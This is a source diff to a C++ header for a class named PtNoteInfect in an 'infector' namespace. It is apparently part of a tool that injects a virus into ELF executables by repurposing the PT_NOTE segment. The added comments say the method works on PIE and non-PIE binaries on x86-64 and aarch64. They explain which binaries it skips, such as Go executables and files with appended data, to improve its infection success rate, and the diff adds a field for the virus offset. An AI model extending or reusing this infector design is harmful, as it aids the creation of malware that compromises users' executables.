@@ -13,10 +13,29 @@ namespace vt::infector {
 //  non-exec sections         |    |             non-exec sections
 //  exec sections             |    |             exec sections
 //  non-exec sections  <------|    |----->       non-exec sections
-//                        RO  |    | RO          
+//                        RO  |    | RO
 //  shdrs              <------|    |----->       shdrs
 //                                 |CODE->       *virus <-------
-// The current
+//
+// Contrary to almost all sources I can find online about this algorithm, this
+// implementation actually works on both PIE and non-PIE binaries after some
+// tweaking (both aarch64 and x86-64).
+//
+// Because elfs compiled from golang uses PT_NOTE for special purposes:
+//
+// $readelf -n /usr/bin/docker
+// Displaying notes found in: .note.go.buildid
+// Owner                Data size 	Description
+// Go                   0x00000053	Unknown note type: (0x00000004)
+//  description data: 6a 4b 45 46 72 64 4c 4c 6
+//
+// We hence do not infect golang elfs. In addition, for binaries that have data
+// appended to the end of the file, we also give up because the application code
+// might reverse seek from the end of the file and look for data there (like
+// bazel). We also skip these. Other than that, this method pretty much allows
+// virus of any size to be inserted and has the highest success rate compared to
+// text padding and reverse text algorithms.
+
 class PtNoteInfect {
  public:
   size_t injected_host_size();
@@ -32,6 +51,7 @@ class PtNoteInfect {
   size_t parasite_size_{};
   Elf64_Addr original_e_entry_{};
   Elf64_Off original_pt_note_file_offset_{};
+  Elf64_Off virus_offset_{};
   Elf64_Addr parasite_load_address_{};
   Elf64_Xword pt_load_alignment_{};
   size_t pt_note_to_be_infected_idx_{};
